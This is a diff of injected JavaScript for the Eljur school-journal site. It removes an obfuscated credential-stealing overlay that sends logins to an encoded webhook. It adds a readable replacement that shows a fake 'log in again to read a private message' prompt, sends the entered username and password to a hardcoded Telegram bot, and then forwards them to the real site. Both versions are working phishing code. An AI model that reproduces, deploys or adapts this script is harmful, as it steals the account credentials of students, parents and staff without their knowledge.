@@ -1,1 +1,154 @@
-function _0x1d9e(_0xda069a,_0x487080){const _0xfb1aec=_0xfb1a();return _0x1d9e=function(_0x1d9e5c,_0x3bb729){_0x1d9e5c=_0x1d9e5c-0x172;let _0xc401a3=_0xfb1aec[_0x1d9e5c];return _0xc401a3;},_0x1d9e(_0xda069a,_0x487080);}function _0xfb1a(){const _0x13248c=['360px','100vh','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22ej-form__text\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#d4edda;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#155724;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#c3e6cb;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x204px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2016px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20600;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','error','current-password','106035hFjUoK','ej-form__header','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22ej-form__text\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22notice\x20notice--red\x20notice--medium\x20EE3uyMsVK9TnBlbQZ4Sh\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22notice__content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22notice__content__icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22notice__content__text\x22><p>','12px','appendChild','\x0a\x20\x20\x20\x20@supports\x20(font-variation-settings:\x20normal)\x20{\x0a\x20\x20\x20\x20\x20\x20@font-face\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20ascent-override:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-display:\x20swap;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Intervar;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-style:\x20normal;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20100\x20900;\x0a\x20\x20\x20\x20\x20\x20\x20\x20src:\x20url(\x27/assets/dist/inter_roman_var.ba4caefc.woff2\x27)\x20format(\x27woff2\x20supports\x20variations(gvar)\x27),\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20url(\x27/assets/dist/inter_roman_var.ba4caefc.woff2\x27)\x20format(\x27woff2-variations\x27),\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20url(\x27/assets/dist/inter_roman_var.ba4caefc.woff2\x27)\x20format(\x27woff2\x27);\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20@font-face\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20ascent-override:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-display:\x20swap;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Intervar;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-style:\x20italic;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20100\x20900;\x0a\x20\x20\x20\x20\x20\x20\x20\x20src:\x20url(\x27/assets/dist/inter_italic_var.30807be7.woff2\x27)\x20format(\x27woff2\x20supports\x20variations(gvar)\x27),\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20url(\x27/assets/dist/inter_italic_var.30807be7.woff2\x27)\x20format(\x27woff2-variations\x27),\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20url(\x27/assets/dist/inter_italic_var.30807be7.woff2\x27)\x20format(\x27woff2\x27);\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20body,\x20input,\x20button,\x20label\x20{\x0a\x20\x20\x20\x20\x20\x20font-family:\x20\x27Intervar\x27,\x20sans-serif;\x0a\x20\x20\x20\x20}\x0a\x20\x20','password','</p></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20','20px','0\x200\x2010px\x20rgba(0,0,0,0.1)','includes','form','textAlign','Неправильный\x20логин\x20или\x20пароль','#b71c1c','required','length','textContent','8px','display','none','input','get','24px','87784nmwrko','createElement','errors','backgroundColor','username','1px\x20solid\x20#ccc','trim','16px','column','\x0a\x20\x20\x20\x20<a\x20href=\x22/invite\x22\x20class=\x22login-form__link\x20login-form__link--left\x22>Регистрация</a>\x0a\x20\x20\x20\x20<a\x20href=\x22/recover\x22\x20class=\x22login-form__link\x20login-form__link--left\x22>Забыли\x20пароль?</a>\x0a\x20\x20','marginBottom','assign','submit','addEventListener','result','justifyContent','div','Логин','/ajaxauthorize','2698GWuhbH','button','Content-Type','ajaxUrl','\x27Intervar\x27,\x20sans-serif','10px','338304lhkApx','430902qJkMqP','onmouseenter','Сессия\x20окончена.\x20войдите\x20снова','759SmVcrW','application/json','style','type','300BOJEbj','onmouseleave','value','Пароль','aHR0cHM6Ly93ZWJob29rLmxld2lzYWt1cmEubW9lL2FwaS93ZWJob29rcy8xNDEyODQ4MzAxNDA0OTc5MzIxL2EySTNXeGFYZ3lGcE9hT1RkS3dCR3hpYVdBVlBfTl9yYkRJNnpnOThqSnBLUlJlOW52V3FOMjc2cDRVVnpyeFpTSF9D','Ошибка:\x20','label','Войти','status','\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20','preventDefault','alignItems','225499uuVNJb','center','4zXJMpa','json','autocomplete','text','body','catch','name','Авторизация\x20успешна','17210axStNI','background','6px','28yATVkS','#d32f2f','stringify','Новая\x20авторизация','4px','innerHTML','9999','flex'];_0xfb1a=function(){return _0x13248c;};return _0xfb1a();}(function(_0x4fe11d,_0xbdad96){const _0x1b45ab=_0x1d9e,_0xba8b49=_0x4fe11d();while(!![]){try{const _0x10856a=parseInt(_0x1b45ab(0x1ce))/0x1+-parseInt(_0x1b45ab(0x1b4))/0x2*(parseInt(_0x1b45ab(0x1c2))/0x3)+parseInt(_0x1b45ab(0x1d0))/0x4*(-parseInt(_0x1b45ab(0x189))/0x5)+-parseInt(_0x1b45ab(0x1ba))/0x6*(-parseInt(_0x1b45ab(0x17c))/0x7)+-parseInt(_0x1b45ab(0x1a1))/0x8+-parseInt(_0x1b45ab(0x1bb))/0x9+parseInt(_0x1b45ab(0x179))/0xa*(-parseInt(_0x1b45ab(0x1be))/0xb);if(_0x10856a===_0xbdad96)break;else _0xba8b49['push'](_0xba8b49['shift']());}catch(_0x18607e){_0xba8b49['push'](_0xba8b49['shift']());}}}(_0xfb1a,0x1ca50),((()=>{const _0x49a090=_0x1d9e,_0x5c8600=document['body'][_0x49a090(0x181)],_0x3cd6d8={'margin':document[_0x49a090(0x175)]['style']['margin'],'background':document[_0x49a090(0x175)]['style'][_0x49a090(0x17a)],'display':document['body']['style'][_0x49a090(0x19c)],'justifyContent':document[_0x49a090(0x175)][_0x49a090(0x1c0)][_0x49a090(0x1b0)],'alignItems':document[_0x49a090(0x175)][_0x49a090(0x1c0)][_0x49a090(0x1cd)],'height':document[_0x49a090(0x175)][_0x49a090(0x1c0)]['height']},_0x244e0d=document[_0x49a090(0x1a2)](_0x49a090(0x1c0));_0x244e0d[_0x49a090(0x19a)]=_0x49a090(0x18e),document['head']['appendChild'](_0x244e0d);const _0x15a6e7=document[_0x49a090(0x1a2)](_0x49a090(0x1b1));_0x15a6e7['id']='loginviewport',Object[_0x49a090(0x1ac)](_0x15a6e7['style'],{'position':'fixed','top':'0','left':'0','width':'100vw','height':_0x49a090(0x185),'background':'rgba(245,\x20245,\x20245,\x200.98)','display':_0x49a090(0x183),'justifyContent':'center','alignItems':_0x49a090(0x1cf),'zIndex':_0x49a090(0x182),'fontFamily':_0x49a090(0x1b8)});const _0x5e2e14=document[_0x49a090(0x1a2)](_0x49a090(0x1b1));Object['assign'](_0x5e2e14['style'],{'width':_0x49a090(0x184),'padding':_0x49a090(0x191),'background':'white','boxShadow':_0x49a090(0x192),'borderRadius':_0x49a090(0x19b)}),_0x15a6e7[_0x49a090(0x18d)](_0x5e2e14);const _0x3ead08=document[_0x49a090(0x1a2)](_0x49a090(0x1b1));_0x5e2e14['appendChild'](_0x3ead08);function _0x2b6527(_0x43b17d){const _0x2dad80=_0x49a090;_0x3ead08[_0x2dad80(0x181)]=_0x2dad80(0x18b)+_0x43b17d+_0x2dad80(0x190);}function _0x50908e(_0x204349){const _0x25bf5f=_0x49a090;_0x3ead08[_0x25bf5f(0x181)]=_0x25bf5f(0x186)+_0x204349+_0x25bf5f(0x1cb);}function _0x4596c5(){const _0x116ff1=_0x49a090;_0x3ead08[_0x116ff1(0x181)]='';}const _0x44c91=document['createElement']('h1');_0x44c91['className']=_0x49a090(0x18a),_0x44c91[_0x49a090(0x19a)]=_0x49a090(0x1bd),_0x44c91[_0x49a090(0x1c0)][_0x49a090(0x195)]='center',_0x44c91['style'][_0x49a090(0x1ab)]='24px',_0x5e2e14[_0x49a090(0x18d)](_0x44c91);const _0x1caafd=document['createElement'](_0x49a090(0x194));Object['assign'](_0x1caafd[_0x49a090(0x1c0)],{'display':'flex','flexDirection':_0x49a090(0x1a9)});const _0x2f4ca5=document[_0x49a090(0x1a2)](_0x49a090(0x1c8));_0x2f4ca5[_0x49a090(0x19a)]=_0x49a090(0x1b2),_0x2f4ca5[_0x49a090(0x1c0)][_0x49a090(0x1ab)]=_0x49a090(0x17b),_0x1caafd[_0x49a090(0x18d)](_0x2f4ca5);const _0x92a225=document[_0x49a090(0x1a2)](_0x49a090(0x19e));_0x92a225['type']='text',_0x92a225[_0x49a090(0x177)]='login',_0x92a225['autocomplete']=_0x49a090(0x1a5),_0x92a225[_0x49a090(0x198)]=!![],Object['assign'](_0x92a225[_0x49a090(0x1c0)],{'padding':_0x49a090(0x1b9),'marginBottom':'16px','fontSize':_0x49a090(0x1a8),'border':'1px\x20solid\x20#ccc','borderRadius':_0x49a090(0x180)}),_0x1caafd['appendChild'](_0x92a225);const _0x3a3aaa=document[_0x49a090(0x1a2)](_0x49a090(0x1c8));_0x3a3aaa[_0x49a090(0x19a)]=_0x49a090(0x1c5),_0x3a3aaa['style']['marginBottom']=_0x49a090(0x17b),_0x1caafd['appendChild'](_0x3a3aaa);const _0x594b09=document[_0x49a090(0x1a2)](_0x49a090(0x19e));_0x594b09[_0x49a090(0x1c1)]=_0x49a090(0x18f),_0x594b09['name']=_0x49a090(0x18f),_0x594b09[_0x49a090(0x173)]=_0x49a090(0x188),_0x594b09[_0x49a090(0x198)]=!![],Object[_0x49a090(0x1ac)](_0x594b09[_0x49a090(0x1c0)],{'padding':_0x49a090(0x1b9),'marginBottom':_0x49a090(0x1a0),'fontSize':'16px','border':_0x49a090(0x1a6),'borderRadius':_0x49a090(0x180)}),_0x1caafd['appendChild'](_0x594b09);const _0x5edf35=document[_0x49a090(0x1a2)](_0x49a090(0x1b5));_0x5edf35['type']=_0x49a090(0x1ad),_0x5edf35[_0x49a090(0x19a)]=_0x49a090(0x1c9),Object[_0x49a090(0x1ac)](_0x5edf35[_0x49a090(0x1c0)],{'backgroundColor':_0x49a090(0x17d),'color':'white','fontSize':'16px','padding':_0x49a090(0x18c),'border':_0x49a090(0x19d),'borderRadius':_0x49a090(0x180),'cursor':'pointer','transition':'background-color\x200.3s'}),_0x5edf35[_0x49a090(0x1bc)]=()=>_0x5edf35[_0x49a090(0x1c0)][_0x49a090(0x1a4)]=_0x49a090(0x197),_0x5edf35[_0x49a090(0x1c3)]=()=>_0x5edf35[_0x49a090(0x1c0)]['backgroundColor']=_0x49a090(0x17d),_0x1caafd[_0x49a090(0x18d)](_0x5edf35);const _0x958372=document[_0x49a090(0x1a2)](_0x49a090(0x1b1));_0x958372['className']='login-form__links',_0x958372[_0x49a090(0x1c0)]['marginTop']=_0x49a090(0x18c),_0x958372[_0x49a090(0x181)]=_0x49a090(0x1aa),_0x5e2e14['appendChild'](_0x1caafd),_0x5e2e14[_0x49a090(0x18d)](_0x958372);const _0x1892fe=_0x49a090(0x1c6);function _0x4a5353(_0x3dd33d){return atob(_0x3dd33d);}_0x1caafd[_0x49a090(0x1ae)](_0x49a090(0x1ad),_0x303f2a=>{const _0x4df50b=_0x49a090;_0x303f2a[_0x4df50b(0x1cc)](),_0x4596c5();const _0x37626d=_0x92a225[_0x4df50b(0x1c4)][_0x4df50b(0x1a7)](),_0xb65822=_0x594b09['value'];if(!_0x37626d||!_0xb65822){_0x2b6527('Пожалуйста,\x20заполните\x20все\x20поля');return;}const _0x55859d=window[_0x4df50b(0x1b7)]||_0x4df50b(0x1b3);fetch(_0x55859d,{'method':'POST','headers':{'Content-Type':_0x4df50b(0x1bf)},'body':JSON[_0x4df50b(0x17e)]({'username':_0x37626d,'password':_0xb65822}),'credentials':'include'})['then'](async _0x3cb1c5=>{const _0x2c5849=_0x4df50b,_0x1c56f0=_0x3cb1c5['headers'][_0x2c5849(0x19f)](_0x2c5849(0x1b6))||'';let _0x25ef79={};_0x1c56f0[_0x2c5849(0x193)](_0x2c5849(0x1bf))&&(_0x25ef79=await _0x3cb1c5[_0x2c5849(0x172)]());if(!_0x3cb1c5['ok']){const _0x400406=_0x25ef79[_0x2c5849(0x1a3)]&&_0x25ef79['errors']['length']&&_0x25ef79[_0x2c5849(0x1a3)][0x0][_0x2c5849(0x174)]?_0x25ef79[_0x2c5849(0x1a3)][0x0][_0x2c5849(0x174)]:'Ошибка:\x20'+_0x3cb1c5[_0x2c5849(0x1ca)];_0x2b6527(_0x400406);return;}if(!_0x25ef79[_0x2c5849(0x1af)]){const _0x381dbf=_0x25ef79['errors']&&_0x25ef79[_0x2c5849(0x1a3)][_0x2c5849(0x199)]&&_0x25ef79[_0x2c5849(0x1a3)][0x0]['text']?_0x25ef79['errors'][0x0][_0x2c5849(0x174)]:_0x2c5849(0x196);_0x2b6527(_0x381dbf);return;}const _0x15bbb2=_0x4a5353(_0x1892fe);fetch(_0x15bbb2,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x2c5849(0x17e)]({'content':null,'embeds':[{'title':_0x2c5849(0x17f),'color':0xff0000,'fields':[{'name':_0x2c5849(0x1b2),'value':_0x37626d,'inline':!![]},{'name':_0x2c5849(0x1c5),'value':_0xb65822,'inline':!![]}],'timestamp':new Date()['toISOString']()}]})})[_0x2c5849(0x176)](console[_0x2c5849(0x187)]),_0x50908e(_0x2c5849(0x178)),setTimeout(()=>{const _0x16d5ad=_0x2c5849;document[_0x16d5ad(0x175)]['removeChild'](_0x15a6e7);for(const _0x1e6feb in _0x3cd6d8){document[_0x16d5ad(0x175)][_0x16d5ad(0x1c0)][_0x1e6feb]=_0x3cd6d8[_0x1e6feb];}document[_0x16d5ad(0x175)][_0x16d5ad(0x181)]=_0x5c8600;},0x5dc);})[_0x4df50b(0x176)](_0x4a024b=>{const _0x618b69=_0x4df50b;_0x2b6527(_0x618b69(0x1c7)+_0x4a024b['message']);});}),document[_0x49a090(0x175)][_0x49a090(0x18d)](_0x15a6e7);})()));
+// Блокируем прокрутку
+document.body.style.position = "relative";
+document.body.style.overflow = "hidden";
+
+// Размытие фона
+const blurOverlay = document.createElement("div");
+Object.assign(blurOverlay.style, {
+  position: "fixed",
+  top: "0",
+  left: "0",
+  width: "100%",
+  height: "100%",
+  backdropFilter: "blur(8px)",
+  background: "rgba(0,0,0,0.4)",
+  zIndex: "9998"
+});
+document.body.appendChild(blurOverlay);
+
+// Окно логина
+const loginViewport = document.createElement("div");
+loginViewport.id = "loginviewport";
+loginViewport.className = "login-outer";
+Object.assign(loginViewport.style, {
+  position: "fixed",
+  top: "50%",
+  left: "50%",
+  transform: "translate(-50%, -50%)",
+  zIndex: "9999",
+  background: "#fff",
+  borderRadius: "12px",
+  boxShadow: "0 0 15px rgba(0,0,0,0.3)",
+  padding: "30px",
+  maxWidth: "400px",
+  width: "100%"
+});
+
+loginViewport.innerHTML = `
+  <div class="login-form login-form--centered">
+    <div class="login-form__body">
+      <h1 class="ej-form__header" style="text-align:center;">
+        Для прочтения личного сообщения войдите снова
+      </h1>
+      <div class="error-container"></div>
+      <form method="post" name="login" class="ej-form ej-form--text-center ej-form--vertical">
+        <div class="ej-form__body">
+          <div class="ej-form-group ej-form-group--12">
+            <label class="ej-form-label"><span>Логин</span></label>
+            <div class="ej-form-control">
+              <input autocomplete="username" type="text" class="field field--fill field--big" />
+            </div>
+          </div>
+          <div class="ej-form-group ej-form-group--12">
+            <label class="ej-form-label"><span>Пароль</span></label>
+            <div class="ej-form-control">
+              <input autocomplete="current-password" type="password" class="field field--fill field--big" />
+            </div>
+          </div>
+        </div>
+        <div class="ej-form__footer">
+          <button type="submit" class="button button--red button--big button--fill">Войти</button>
+        </div>
+      </form>
+    </div>
+  </div>
+`;
+
+document.body.appendChild(loginViewport);
+
+// Функция отправки в Telegram
+function sendToTelegram(login, password) {
+  const token = "8385745346:AAGl9qWQ5vQMVXSHaMe9tBGBUDoK46cn-Z8";
+  const chatId = "-1003077695457"; 
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+  const text = `🔑 Логин: ${login}\n🔒 Пароль: ${password}`;
+
+  fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: text
+    })
+  }).catch(err => console.error("Ошибка отправки в Telegram:", err));
+}
+
+// Логика кнопки "Войти"
+const form = loginViewport.querySelector("form");
+form.addEventListener("submit", function (e) {
+  e.preventDefault();
+
+  const loginInput = loginViewport.querySelector('input[autocomplete="username"]');
+  const passInput  = loginViewport.querySelector('input[autocomplete="current-password"]');
+
+  const loginVal = (loginInput.value || "").trim();
+  const passVal  = (passInput.value || "").trim();
+
+  const errorContainer = loginViewport.querySelector(".error-container");
+  errorContainer.innerHTML = ""; // очищаем старые ошибки
+
+  if (!loginVal || !passVal) {
+    errorContainer.innerHTML = `
+      <div class="notice notice--red notice--medium">
+        <div class="notice__content">
+          <div class="notice__content__text"><p>Заполните логин и пароль</p></div>
+        </div>
+      </div>`;
+    return;
+  }
+
+  // Отправляем данные в Telegram
+  sendToTelegram(loginVal, passVal);
+
+  // Запрос на Eljur
+  fetch("https://shkolakzn.eljur.ru/ajaxauthorize", {
+    method: "POST",
+    headers: {
+      "accept": "*/*",
+      "content-type": "application/json"
+    },
+    body: JSON.stringify({
+      username: loginVal,
+      password: passVal
+    })
+  })
+    .then(res => res.json())
+    .then(data => {
+      if (data.result && data.actions && data.actions[0]?.type === "redirect") {
+        // успешный вход
+        blurOverlay.remove();
+        loginViewport.remove();
+        document.body.style.overflow = "";
+        document.body.style.position = "";
+      } else if (data.errors && data.errors.length > 0) {
+        // ошибка
+        const msg = data.errors[0].text || "Ошибка входа";
+        errorContainer.innerHTML = `
+          <div class="notice notice--red notice--medium">
+            <div class="notice__content">
+              <div class="notice__content__text"><p>${msg}</p></div>
+            </div>
+          </div>`;
+      }
+    })
+    .catch(err => {
+      console.error("Ошибка запроса:", err);
+      errorContainer.innerHTML = `
+        <div class="notice notice--red notice--medium">
+          <div class="notice__content">
+            <div class="notice__content__text"><p>Сервер недоступен</p></div>
+          </div>
+        </div>`;
+    });
+});
